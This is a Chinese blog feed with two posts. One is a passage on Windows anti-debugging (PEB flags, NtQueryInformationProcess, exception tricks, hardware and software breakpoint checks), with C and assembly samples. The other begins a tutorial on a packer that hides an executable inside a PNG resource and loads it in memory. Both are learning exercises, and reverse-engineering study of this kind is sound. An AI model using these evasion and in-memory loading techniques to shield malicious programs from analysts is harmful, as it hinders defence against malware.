中标志位的值是 x70，符合上面所说的 0x20|0x40。接下来尝试实现一下。首先因为我用的 MinGW 所以需要写两句汇编去取PEB指针。（用的 nasm，gcc 的内联汇编语法太怪了）\n1 2 3 4 5 6  section .text global _GetPEB _GetPEB: mov eax,[fs:30h] retn   再具体实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  void anti_debug_by_RtlGetNtGlobalFlags(void) { // 两种方式，直接读内存或者用undocumented接口  PPEB peb = GetPEB(); if (*(PULONG)((PBYTE)peb + 0x68) \u0026amp; (0x20 | 0x40)) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;PEB-\u0026gt;NtGlobalFlag\u0026#34;, MB_OK); } // 或者...  HMODULE ntdll = LoadLibraryA(\u0026#34;ntdll.dll\u0026#34;); FARPROC proc = GetProcAddress(ntdll, \u0026#34;RtlGetNtGlobalFlags\u0026#34;); typedef ULONG (*RtlGetNtGlobalFlags_t)(void); if (((RtlGetNtGlobalFlags_t)proc)() \u0026amp; (0x20 | 0x40)) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;RtlGetNtGlobalFlags\u0026#34;, MB_OK); } }   差别不大，可以根据需要选择其一。编译后不使用调试器打开则不会触发反调试代码。\nbypass 这个检查也很容易，因为标志位都在被调试进程的地址空间里，直接改掉就行了。\n2.3 HEAP-\u0026gt;Flags PEB 结构中还有个指向当前堆信息结构的指针，ProcessHeap。可以用 WinDbg 的 dt 命令查看。\n1 2 3  0:000\u0026gt; dt _peb processheap @$peb ntdll!_PEB +0x018 ProcessHeap : 0x012d0000 Void   而这个 heap 结构的也同样可以用 dt 命令查看。我们关注的是 heap 结构中的 Flags 和 ForceFlags 字段。\n1 2 3 4 5 6  0:000\u0026gt; dt _heap flags 0x012d0000 ntdll!_HEAP +0x040 Flags : 0x40000062 0:000\u0026gt; dt _heap forceflags 0x012d0000 ntdll!_HEAP +0x044 ForceFlags : 0x40000060   当 Flags 没有 HEAP_GROWABLE 标志位，或 ForceFlags 不为零的时候，则可能存在调试器。同样的， 没有官方的文档，只能说逆向出这些东西的大佬真是太强啦。关于 Flags 谷歌了一下，发现在 CTF Wiki 有比较详细的说明。我搬一部分过来。\n 在所有版本的 Windows 中, Flags字段的值正常情况都设为HEAP_GROWABLE(2), 而ForceFlags字段正常情况都设为0. 然而对于一个 32 位进程 (64 位程序不会有此困扰), 这两个默认值, 都取决于它的宿主进程(host process) 的 subsystem版本 (这里不是指所说的比如 win10 的 linux 子系统). 只有当subsystem在3.51及更高的版本, 字段的默认值才如前所述. 如果是在3.10-3.50版本之间, 则两个字段的HEAP_CREATE_ALIGN_16 (0x10000)都会被设置. 如果版本低于3.10, 那么这个程序文件就根本不会被运行.\n如果某操作将Flags和ForgeFlags字段的值分别设为2和0, 但是却未对subsystem版本进行检查, 那么就可以表明该动作是为了隐藏调试器而进行的.\n 接下来给出案例代码：\n1 2 3 4 5 6 7 8 9 10  void anti_debug_by_PEB_HeapFlags(void) { PPEB peb = GetPEB(); PVOID heap = *(PDWORD)((PBYTE)peb + 0x18); PDWORD heapFlags = (PDWORD)((PBYTE)heap + 0x40); PDWORD forceFlags = (PDWORD)((PBYTE)heap + 0x44); if (*heapFlags \u0026amp; ~HEAP_GROWABLE || *forceFlags != 0) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;PEB-\u0026gt;_HEAP-\u0026gt;HeapFlags,ForceFlags\u0026#34;, MB_OK); } }   代码本身很简单，不多解释。在调试器启动时会触发反调试代码，正常运行则不会。这个检查比较粗陋，可以根据上面 CTF Wiki 摘录内容的说法，根据 PE 头中的 subsystem 来二次判断，来发现尝试 bypass 反调试代码的行为。\n至于如何 bypass 这个反调试方案，按上面给出的原理来反向应用就好了。\n2.4 CheckRemoteDebuggerPresent CheckRemoteDebuggerPresent 的微软文档中这么描述：确定指定进程是否正在被调试。接受两个参数，一个是进程的 HANDLE，一个是 PBOOL。\n应用方式可以有很多，可以在进程内自己检查自己有没有被调试；或者开新进程去监视原进程是否正在被调试；甚至注入正常进程，隐藏好自己，再去监视原进程是否被调试；甚至干脆潜伏下来开个后门，亲自人肉监视屏幕上有没有调试器\u0026hellip;\u0026hellip;越说越离谱了。\n总之先给了案例。\n1 2 3 4 5 6 7 8  void anti_debug_by_CheckRemoteDebuggerPresent(void) { BOOL isRemoteDebuggerPresent = FALSE; if (CheckRemoteDebuggerPresent(GetCurrentProcess(), \u0026amp;isRemoteDebuggerPresent)) { if (isRemoteDebuggerPresent == TRUE) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;CheckRemoteDebuggerPresent\u0026#34;, MB_OK); } } }   代码很简单不多解释，不过从这里可以引出新的内容：CheckRemoteDebuggerPresent 的实现方式是调用 NtQueryInformationProcess ，一个没有文档的内核接口。\n2.5 NtQueryInformationProcess NtQueryInformationProcess 同样没文档，这里给出比较清晰的 CTF Wiki 的说明链接。NtQueryInformationProcess 是一个查询信息的接口，输入参数包括查询的信息类型、进程HANDLE、结果指针等。用法同样是简单的。\n值得关注的查询信息类型包括：\n ProcessDebugPort ProcessBasicInformation ProcessDebugObjectHandle ProcessDebugFlags  对于 ProcessDebugPort，查询结果是一个 DWORD，当存在调试器时查询结果会是 0xffffffff。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  void anti_debug_by_NtQueryInformationProcess(void) { HMODULE ntdll = LoadLibrary(TEXT(\u0026#34;ntdll.dll\u0026#34;)); if (ntdll == NULL) { abort(); } FARPROC ntQueryInfoProc = GetProcAddress(ntdll, \u0026#34;NtQueryInformationProcess\u0026#34;); if (ntQueryInfoProc == NULL) { abort(); } DWORD isDebuggerPresent = FALSE; NTSTATUS status = ntQueryInfoProc(GetCurrentProcess(), ProcessDebugPort, \u0026amp;isDebuggerPresent, sizeof(DWORD), NULL); if (status == 0 \u0026amp;\u0026amp; isDebuggerPresent) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;NtQueryInformationProcess\u0026#34;, MB_OK); return; } }   对于 ProcessBasicInformation，查询结果是 PROCESS_BASIC_INFORMATION 结构，可以根据这个结构来进一步判断父进程是否是已知的调试器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #ifdef UNICODE # define MY_STRCMP wcscmp #else # define MY_STRCMP strcmp #endif  void anti_debug_by_NtQueryInformationProcess_BasicInformation(void) { HMODULE ntdll = LoadLibrary(TEXT(\u0026#34;ntdll.dll\u0026#34;)); if (ntdll == NULL) { abort(); } FARPROC ntQueryInfoProc = GetProcAddress(ntdll, \u0026#34;NtQueryInformationProcess\u0026#34;); if (ntQueryInfoProc == NULL) { abort(); } PROCESS_BASIC_INFORMATION info; NTSTATUS status = ntQueryInfoProc(GetCurrentProcess(), ProcessBasicInformation, \u0026amp;info, sizeof(info), NULL); if (status == 0) { HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcSnap == NULL) { abort(); } PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcSnap, \u0026amp;pe32)) { abort(); } do { if (pe32.th32ProcessID == info.InheritedFromUniqueProcessId) { if (MY_STRCMP(TEXT(\u0026#34;devenv.exe\u0026#34;), pe32.szExeFile) == 0 || MY_STRCMP(TEXT(\u0026#34;x32dbg.exe\u0026#34;), pe32.szExeFile) == 0 || MY_STRCMP(TEXT(\u0026#34;x64dbg.exe\u0026#34;), pe32.szExeFile) == 0 || MY_STRCMP(TEXT(\u0026#34;ollydbg.exe\u0026#34;), pe32.szExeFile) == 0) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;BasicInformation\u0026#34;, MB_OK); CloseHandle(hProcSnap); return; } } } while (Process32Next(hProcSnap, \u0026amp;pe32)); } }   ProcessObjectDebugHandle 和 ProcessDebugFlags 就不一一给案例了。检查方式也很简单，就是判断非零则存在调试器。\n1 2  ntQueryInfoProc(GetCurrentProcess(), ProcessObjectDebugHandle, \u0026amp;handle, sizeof(HANDLE), NULL); ntQueryInfoProc(GetCurrentProcess(), ProcessDebugFlags, \u0026amp;flags, sizeof(ULONG), NULL);   因为 NtQueryInformationProcess 是从内核查询消息，所以 bypass 会比较难——就是说需要 HOOK 。但我还不会 HOOK ，所以略过。\n2.6 NtSetInformationThread 又是一个没有文档的API。NtSetInformationThread 等同于 ZwSetInformationThread，通过设置 ThreadHideFromDebugger 标志位可以禁止线程产生调试事件。如果正处于调试状态执行了这个 API 则会导致程序立即退出。\n案例如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  typedef NTSTATUS(NTAPI *pfnNtSetInformationThread)(_In_ HANDLE ThreadHandle, _In_ ULONG ThreadInformationClass, _In_ PVOID ThreadInformation, _In_ ULONG ThreadInformationLength); void anti_debug_by_HideFromDebugger(void) { HMODULE ntdll = LoadLibrary(TEXT(\u0026#34;ntdll.dll\u0026#34;)); if (ntdll == NULL) { abort(); } pfnNtSetInformationThread ntSetInfoThread = (pfnNtSetInformationThread)GetProcAddress(ntdll, \u0026#34;NtSetInformationThread\u0026#34;); if (ntSetInfoThread == NULL) { abort(); } ntSetInfoThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0); // ... NtCreateThreadEx THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER }   同样因为这一方式是走内核接口，可以通过 HOOK 技术把相应的标志位拦截掉就行。\n2.7 Set/GetLastError 对SetLastError和GetLastError的利用方式是结合 OutputDebugString 失败时会修改 GetLastError() 的错误码的行为，判断是否有调试器存在。\n1 2 3 4 5 6 7 8  // TODO: somehow not work on windows 10, need more test. void anti_debug_by_SetLastError(void) { SetLastError(0x1234); OutputDebugString(TEXT(\u0026#34;Hello Debugger!\u0026#34;)); if (GetLastError() == 0x1234) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;Set/Get LastError\u0026#34;, MB_OK); } }   比较奇怪的是在我这无论在不在调试环境跑都会触发反调试，环境 Windows 10 + MinGW 。\n0x03 异常处理方式 异常处理方式的反调试，是通过触发会被调试器处理的中断或者异常，如果调试器拦截并处理了中断或异常，就会导致程序里注册的异常处理函数未被执行，进而发现正在被调试。\n这个思路也可以用来构造特殊的控制流，比如把关键逻辑放在中断处理函数里，然后抛出 INT 1 中断（单步执行），如果被调试器命中，则我们构造的控制流就会被破坏，程序就会跑飞。\n3.1 INT 1 INT 1 中断的含义是 SINGLE STEP，在调试器上的表现就是会让调试器断在中断的位置（反正在x32dbg上的表现是这样）。INT 1中断后，如果没有调试器，那么控制权会转交给调试器，SEH 不会执行，反之则 SEH 执行，用户程序保留控制权。\n实际上发现 x32dbg 即使断到了也会把控制权转给 SEH，所以对关于 SEH 反调试是否可行、如何实现持疑问。但是经过一番搜索和研究发现 VEH 机制可以实现上述逻辑。案例代码如下。\n用来抛出 INT 1 中断的汇编代码\n1 2 3 4 5 6 7 8  section .text global _RaiseInt1 _RaiseInt1: pushfd or [esp],dword 0x100 popfd retn   检测调试器的函数如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  BOOL volatile VEH_INT1_isDebuggerPresent = FALSE; LONG CALLBACK VEH_INT1_UnhandledExceptionFilter(_In_ EXCEPTION_POINTERS *lpEP) { switch (lpEP-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode) { case EXCEPTION_SINGLE_STEP: // handle single step exception if not handled by debugger  VEH_INT1_isDebuggerPresent = FALSE; return EXCEPTION_CONTINUE_EXECUTION; default: return EXCEPTION_CONTINUE_SEARCH; } } void anti_debug_by_VEH_INT1(void) { VEH_INT1_isDebuggerPresent = TRUE; // https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter  SetUnhandledExceptionFilter(VEH_INT1_UnhandledExceptionFilter); // https://docs.microsoft.com/zh-cn/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler?redirectedfrom=MSDN  // https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pvectored_exception_handler  RaiseInt1(); if (VEH_INT1_isDebuggerPresent == TRUE) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;VEH INT1\u0026#34;, MB_OK); } }   利用 SetUnhandledExceptionFilter 实现，文档链接在注释里给出了。也可以再罗嗦一点，结合 AddVectoredExceptionHandler 实现。但逻辑还是那样。\nINT 1中断方式检测调试器后，可以恢复到正常控制流执行。但是 INT 3 会有所区别，INT 3 中断时 EIP 会停留在中断指令处，中断处理中需要修改 EIP 的值恢复控制流。\n关于 SEH 中断反调试我留个链接：看雪论坛：基于SEH的静态反调试实例分析，有空再分析看看。\n3.2 INT 3 INT 3 中断就是 0xcc 一字节中断指令，顺便一提啊，因为VC会用 0xcc 填充未初始化的栈，用C写过代码多少都见过的 烫烫烫 错误就是来自于此。\n参考 CTF Wiki - Interrupt 3。\n 当EXCEPTION_BREAKPOINT(0x80000003)异常触发时, Windows 会认定这是由单字节的 \u0026ldquo;CC\u0026rdquo; 操作码 (也即Int 3指令) 造成的. Windows 递减异常地址以指向所认定的 \u0026ldquo;CC\u0026rdquo; 操作码, 随后传递该异常给异常处理句柄. 但是 EIP 寄存器的值并不会发生变化.\n因此, 如果使用了 CD 03（这是 Int 03 的机器码表示），那么当异常处理句柄接受控制时, 异常地址是指向 03 的位置.\n 这里有一个调试中发现的怪异问题：调试器内运行时会平栈错误，esp 会越过原本的返回地址，导致执行到 ret 时返回地址是0，产生异常。目前不确定是不是因为上面说的EIP没有+1导致的问题。\n案例代码如下。\n1 2 3 4 5 6  section .text global _RaiseInt3 _RaiseInt3: int 3 retn   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  BOOL volatile VEH_INT3_isDebuggerPresent = FALSE; LONG CALLBACK VEH_INT3_UnhandledExceptionFilter(_In_ EXCEPTION_POINTERS *lpEP) { switch (lpEP-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode) { case EXCEPTION_BREAKPOINT: // handle single step exception if not handled by debugger  VEH_INT3_isDebuggerPresent = FALSE; lpEP-\u0026gt;ContextRecord-\u0026gt;Eip += 1; return EXCEPTION_CONTINUE_EXECUTION; default: return EXCEPTION_CONTINUE_SEARCH; } } void anti_debug_by_VEH_INT3(void) { VEH_INT3_isDebuggerPresent = TRUE; SetUnhandledExceptionFilter(VEH_INT3_UnhandledExceptionFilter); RaiseInt3(); if (VEH_INT3_isDebuggerPresent == TRUE) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;SEH INT3\u0026#34;, MB_OK); } }   可以看到和 INT1 的案例别无二致。这里再附带上汇编结果，大佬也可以看看上面说的平栈问题是怎么回事。编译好的案例会附在最末。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  sub esp, 0x1C mov dword ptr ds:[0x5B4000], 0x1 mov dword ptr ss:[esp], \u0026lt;packed.sub_5B1390\u0026gt; call dword ptr ds:[\u0026lt;\u0026amp;_SetUnhandledExceptionFilterStub@4\u0026gt;] sub esp, 0x4 call packed.5B1AA1 ; int3, retn mov eax, dword ptr ds:[0x5B4000] cmp eax, 0x1 je packed.5B1650 add esp, 0x1C ret mov dword ptr ss:[esp+0xC], 0x0 mov dword ptr ss:[esp+0x8], packed.5B20A1 mov dword ptr ss:[esp+0x4], packed.5B202A mov dword ptr ss:[esp], 0x0 call dword ptr ds:[\u0026lt;\u0026amp;MessageBoxA\u0026gt;] sub esp, 0x10 add esp, 0x1C ret   3.3 DebugOutputString 利用方式和前面一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // TODO: NOT WORK  BOOL VEH_OutputDebugStringException_isDebugPresent = FALSE; LONG CALLBACK VEH_OutputDebugStringException_UnhandledExceptionFilter(_In_ EXCEPTION_POINTERS *lpEP) { switch (lpEP-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode) { case EXCEPTION_BREAKPOINT: // handle single step exception if not handled by debugger  VEH_INT3_isDebuggerPresent = FALSE; return EXCEPTION_CONTINUE_EXECUTION; default: return EXCEPTION_CONTINUE_SEARCH; } } void anti_debug_by_VEH_OutputDebugException(void) { ULONG_PTR args[4] = {0, 0, 0, 0}; args[0] = (ULONG_PTR)wcslen(L\u0026#34;debug\u0026#34;) + 1; args[1] = (ULONG_PTR)L\u0026#34;debug\u0026#34;; AddVectoredExceptionHandler(0, VEH_OutputDebugStringException_UnhandledExceptionFilter); VEH_OutputDebugStringException_isDebugPresent = TRUE; RaiseException(DBG_PRINTEXCEPTION_WIDE_C, 0, 4, args); RemoveVectoredExceptionHandler(VEH_OutputDebugStringException_UnhandledExceptionFilter); if (VEH_OutputDebugStringException_isDebugPresent == TRUE) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;OutputDebugString\u0026#34;, MB_OK); } }   实测发现 x32dbg 并不会处理 DBG_PRINTEXCEPTION_WIDE_C ，所以这个反调试对 x32dbg 没用。\n3.4 INVALID_HANDLE 根据微软的文档 CloseHandle function (handleapi.h) 说明：\n If the application is running under a debugger, the function will throw an exception if it receives either a handle value that is not valid or a pseudo-handle value. This can happen if you close a handle twice, or if you call CloseHandle on a handle returned by the FindFirstFile function instead of calling the FindClose function.\n 可以得知，在调试器启动时，CloseHandle 关闭无效的 HANDLE 时会出现 EXCEPTION_INVALID_HANDLE 异常。所以只要故意关闭一个无效的 HANDLE，抓住这个异常，就能确定调试器存在。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  LONG CALLBACK VEH_INVALID_HANDLE_UnhandledExceptionFilter(_In_ EXCEPTION_POINTERS *lpEP) { switch (lpEP-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode) { case EXCEPTION_INVALID_HANDLE: // if debug present  MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;INVALID HANDLE\u0026#34;, MB_OK); return EXCEPTION_CONTINUE_EXECUTION; default: return EXCEPTION_CONTINUE_SEARCH; } } void anti_debug_by_VEH_INVALID_HANDLE(void) { AddVectoredExceptionHandler(0, VEH_INVALID_HANDLE_UnhandledExceptionFilter); CloseHandle((HANDLE)0xBAAD); RemoveVectoredExceptionHandler(VEH_INVALID_HANDLE_UnhandledExceptionFilter); }   和之前的检查不同，INVALID_HANDLE 是 出现这个异常才存在调试器，之前的异常处理方式都是没出现异常才存在调试器。\n0x04 硬件断点 x86 体系上存在一套调试寄存器，就是 dr0-dr7这8个寄存器。其中dr0-dr3保存的硬件断点的线性地址，断点条件保存在dr7寄存器。dr6寄存器保存的是调试状态，指示触发了哪个断点条件。\n所以发现硬件断点的存在，就可以百分百确定正在被调试。\n4.1 硬件断点 直接给案例代码。\n1 2 3 4 5 6 7 8 9 10  // detect hardware breakpoint void anti_debug_by_DebugRegister(void) { CONTEXT ctx; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; if (GetThreadContext(GetCurrentThread(), \u0026amp;ctx)) { if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;Dr0-Dr3\u0026#34;, MB_OK); } } }   通过GetThreadContext这个接口获得当前寄存器状态，当然也可以通过内联汇编来实现。当发现四个断点寄存器非零就可以确定正在被调试了。\n0x05 完整性校验 完整性校验反调试的原理是检测 0xCC 软件断点，当我们一般说的在程序里下断点的时候下的是软件断点，实现的原理是调试器在这个内存位置上临时放一个0xcc占位，当EIP走到这里时会触发一个INT 3中断，调试器趁机取得控制权。同时因为 INT 3 断点不会把 EIP + 1，所以调试器只需要把改成 0xcc 的地方改回去，就可以让程序继续跑而无需去碰寄存器。\n5.1 SoftwareBreakpoint 下面的案例给了一个简单的软件断点检测，只能检测到下在函数开头的软件断点。\n1 2 3 4 5 6 7 8 9 10  // detect 0xcc interrupt code void anti_debug_by_SoftwareBreakPoint(PBYTE addr) { if (*addr == 0xcc) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;SoftwareBreakpoint\u0026#34;, MB_OK); } } // 在主函数里： // anti_debug_by_SoftwareBreakPoint((PBYTE)\u0026amp;load_PE) // 就能检测到在 load_PE 函数开头处下的断点   如果能以一定的方式确定一个函数的代码段大小，也可以做到对整个函数的完整性检测（通过计算 CRC 或者其他哈希算法，甚至就直接累加都行）。\n确定函数代码段大小的方式我只想到一个利用栈上的返回地址=，=在函数开头和结尾部分调用一次获取栈上返回地址的函数就能拿到一个范围了，但感觉并不可靠，主要是编译器优化可能重排代码，而且不走到结尾部分也没法开始计算哈希=，=这都给人调试完了。\n结论 所有案例代码都在这里：[github.com/nnnewb/learning-packer](learning-packer/packer6 at main · nnnewb/learning-packer (github.com))\n总结就是反调试主要靠 判断调试器特征 来发现正在被调试。而这个判断方法就很多，从硬件到操作系统层面，再到软件层面，都有洞可以钻。\n总结这篇里实践的反调试（或者说检测调试器）方式有这些：\n PEB和相关结构的各种标志位 内核接口，NtQueryInformationProcess、NtSetInformationThread等等 异常处理机制，SEH，VEH，触发会被调试器处理的异常（或者只在有调试器时才会触发的异常）来发现调试器 调试寄存器和硬件断点 代码完整性校验发现软件断点  以上就是本篇实验过的所有反调试思路了。原本应该有个通过 TLS 回调隐藏自身的案例，但是 MinGW 加不了 TLS 回调（可能还是我菜），谷歌搜到的做法都是要对编译好的二进制文件打补丁，太麻烦就没搞。\n另外还有个利用执行时间做反调试，因为不知道现在都是怎么利用，然后是这个反调试原理感觉也是很简单=，=就是利用方法可能千奇百怪，单单写两次 time 调用感觉没啥意义就没写（偷懒了）。\n总之就是隐藏好反调试的代码，然后发现调试器就悄悄施展迷惑手段或者干脆大搞破坏。\n参考资料  Anti Debugging Protection Techniques With Examples Geoff Chappell, Software Analyst CTF Wiki 《恶意代码分析实战》  内容主要来自第一个链接，根据我的环境做了一些修改（比如有些SEH的我实测 x32dbg 不行就换成了VEH），结合参考了 CTF wiki 和 《恶意代码分析实战》这书。API 全是微软的文档和没有文档化的接口我不一个一个摆链接了。\n","date":"2021-10-27T19:50:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-06/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-06/","title":"加壳原理06：反调试技术入门"},{"content":"前言 完成了简单的压缩壳之后放松下，在52论坛病毒分析区看到过几次把代码隐藏到图片里的做法，也看到过把程序转成图片后训练神经网络来判断有没有恶意的，于是就想，淦，这不是挺好玩的嘛。\n0x01 思路 用图片保存程序最简单的做法就是直接把程序每个字节都转成像素，然后输出成灰度图。比较进阶的做法就像是二维码了，大色块，容错校验，图片被压到包浆也能扫出来。但那个有点点难（我菜）最终成果也大到不现实，而且实话说打包到程序里就不用考虑被二次压缩的情况了。所以简单的8bit灰度图就刑。\n说到位图肯定有人想到了 BMP ，我记得上学那会儿还跟着网上哪儿找的教程，学着用 ffmpeg 把 Bad Apple 转成位图序列，再转成字符图合并成 HTML，用 js 播放。说起来都是泪。\n现在已经成了正经的码农，再折腾 BMP 就没意思了，PNG 就挺好的。\n图片可以放到 Section 里——但并没有意义，所以我选择放到资源里。写一个 .rc 文件用 windres 编译出目标文件，再拿 gcc 链接就行了。如此一来并没有 lief 出场的机会，编译好的加载器就是加完壳的程序。\n加载器则采用开启 ASLR 的模式，这样程序的节表会比较干净，没有明显特征（虽然也没什么卵用）。\n0x02 加载器 2.1 资源介绍 参考微软的文档 Using Resources、Menu and Other Resources。\n A resource is binary data that you can add to the executable file of a Windows-based application. A resource can be either standard or defined. The data in a standard resource describes an icon, cursor, menu, dialog box, bitmap, enhanced metafile, font, accelerator table, message-table entry, string-table entry, or version information. An application-defined resource, also called a custom resource, contains any data required by a specific application.\n 资源就是一堆打包进可执行文件里的二进制数据，有标准资源类型和自定义的资源类型，标准的回头看就全是微软的历史包袱了，自定义的就是随便什么东西。\n资源本身是有结构的，大体上分三层：\n 类型；比如图标、对话框、位图、Manifest等等。 ID；资源的标识符，可以是数字或字符串。 语言；英语法语等等..  经过这样三层索引就能找到对应资源的原始数据了。\n如图：\n2.2 查找并加载资源 步骤很简单：\n FindResource 找到你要的资源 SizeofResource 确定你要的资源大小 LoadResource 加载资源，得到 HANDLE LockResource 锁定资源，得到资源首字节指针  实现比较啰嗦，主要是错误检查很啰嗦。我这返回值都是随便 return 的，更好的做法应该是 GetLastError 去拿错误码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  int get_resource(const char *name, void **buffer, size_t *length) { HRSRC res_found = FindResourceA(NULL, \u0026#34;BEAUTIFUL.PNG\u0026#34;, RT_RCDATA); if (res_found == NULL) { MessageBoxA(NULL, \u0026#34;find resource failed\u0026#34;, \u0026#34;FindResourceA\u0026#34;, MB_OK); return 1; } DWORD sizeof_res = SizeofResource(NULL, res_found); if (sizeof_res == 0) { MessageBoxA(NULL, \u0026#34;sizeof resource failed\u0026#34;, \u0026#34;SizeofResource\u0026#34;, MB_OK); return 2; } HGLOBAL res_loaded = LoadResource(NULL, res_found); if (res_loaded == NULL) { MessageBoxA(NULL, \u0026#34;load resource failed\u0026#34;, \u0026#34;LoadResource\u0026#34;, MB_OK); return 3; } LPVOID res_acquired = LockResource(res_loaded); if (res_acquired == NULL) { MessageBoxA(NULL, \u0026#34;lock resource failed\u0026#34;, \u0026#34;LockResource\u0026#34;, MB_OK); return 3; } *buffer = malloc(sizeof_res); *length = sizeof_res; memcpy(*buffer, res_acquired, sizeof_res); UnlockResource(res_loaded); FreeResource(res_loaded); return 0; }   得到数据后复制到新分配的内存里返回出去就完事了。\n2.3 解析图片 得到了资源图片的内容之后，下一步就是把图片解码成像素，还原到程序本身了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include \u0026#34;png.h\u0026#34;#include \u0026lt;stddef.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt; typedef uint8_t u8, *u8p; typedef uint32_t u32, *u32p; // decode PNG in memory // https://stackoverflow.com/questions/53237065/using-libpng-1-2-to-write-rgb-image-buffer-to-png-buffer-in-memory-causing-segme u8p read_program_from_png(u8p data, size_t length) { png_image image; memset(\u0026amp;image, 0, sizeof(image)); image.version = PNG_IMAGE_VERSION; if (png_image_begin_read_from_memory(\u0026amp;image, data, length) == 0) { return NULL; } png_bytep buffer; image.format = PNG_FORMAT_GRAY; size_t input_data_length = PNG_IMAGE_SIZE(image); buffer = (png_bytep)malloc(input_data_length); memset(buffer, 0, input_data_length); if (png_image_finish_read(\u0026amp;image, NULL, buffer, 0, NULL) == 0) { return NULL; } u32 actual_len = *((u32 *)buffer); void *program = malloc(actual_len); memcpy(program, buffer + 4, actual_len); free(buffer); return (u8p)program; }   面向 stackoverflow 编程，照着抄一个 libpng 的解码实现。不同的是把解码后的头4个字节作为小端序无符号整型，认为是程序的实际大小。因为程序的大小可能并不正好是图片的像素数量（width*height）。\n最后是把解码后的内容复制到新分配的内存里返回。现在返回的指针应该就指向我们的 PE 文件内容了。\n2.4 入口点 在入口点，调用加载资源函数获得资源数据的指针，传给解码的函数，得到解码后的PE文件指针，然后加载并跳转到被加载程序的入口点，就这么简单。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int _start(void) { void *buffer = NULL; size_t length = 0; if (get_resource(\u0026#34;BEAUTIFUL.PNG\u0026#34;, \u0026amp;buffer, \u0026amp;length) != 0) { return 1; } u8p program = read_program_from_png((u8p)buffer, length); free(buffer); if (program != NULL) { void (*entrypoint)(void) = (void (*)(void))load_PE((char *)program); entrypoint(); free(program); return 0; } MessageBoxA(NULL, \u0026#34;.packed section not found\u0026#34;, \u0026#34;loader error\u0026#34;, MB_OK); return 0; }   0x03 加壳机 3.1 程序转图片 使用 pypng 这个包实现把二进制程序转图片。\n1 2 3 4 5 6 7 8 9 10 11 12  IMG_PATH = \u0026#39;packer5-packed.png\u0026#39; ROW_LEN = 256 with open(\u0026#39;example.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: arr = [] content = f.read() content = struct.pack(\u0026#39;\u0026lt;I\u0026#39;, len(content))+content for i in range(len(content)//ROW_LEN): t = content[i*ROW_LEN:i*ROW_LEN+ROW_LEN] arr.append(t) png.from_array(arr, \u0026#39;L\u0026#39;).save(IMG_PATH)   非常简单的一段脚本。把内容长度和内容拼接后，以 ROW_LEN 每行，拆成一个二维数组，然后用 pypng 编码并保存。\n3.2 编译资源 随便新建一个 rsrc.rc 。\n别问 .rc 怎么写，不知道，问就是面向谷歌编程抄的。\n1  beautiful.png RCDATA \u0026#34;packer5-packed.png\u0026#34;   然后在脚本里调用 windres 编译。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  def windres(sources, output): executable = \u0026#39;windres\u0026#39; args = \u0026#39;\u0026#39; if isinstance(sources, (str, bytes)): args += sources elif isinstance(sources, (list, tuple)): args += \u0026#39; \u0026#39;.join(sources) cmd = f\u0026#39;{executable}{args}-o {output}\u0026#39; proc = run(cmd, shell=True, stderr=STDOUT) if proc.returncode != 0: raise CompilationError(proc.returncode, proc.stdout) windres(path.join(src_dir, \u0026#39;rsrc.rc\u0026#39;), 